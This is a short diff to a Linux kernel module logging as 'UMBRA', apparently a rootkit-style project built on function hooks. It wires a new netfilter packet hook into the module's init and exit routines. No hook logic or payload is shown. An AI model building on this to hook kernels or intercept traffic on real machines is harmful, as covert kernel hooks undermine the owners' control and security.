@@ -15,6 +15,7 @@
 #include "include/hookers.h"
 #include "include/utils.h"
 #include "include/CONFIG.h"
+#include "include/netfilter_manager.h"
 
 #if !defined(CONFIG_X86_64) || (LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0))
 #define VERSION_NOT_SUPPORTED
@@ -31,6 +32,7 @@ MODULE_VERSION("1");
 
 static void __exit mod_exit(void){
     remove_all_hooks();
+    unregister_netfilter_hook();
     
     printk(KERN_INFO "UMBRA:: Successfully unloaded\n");
 }
@@ -42,6 +44,10 @@ static int __init mod_init(void){
         return -1;
     #endif
     err = install_all_hooks();
+    if(err){
+        return err;
+    }
+    err = register_netfilter_hook();
     if(err){
         return err;
     }
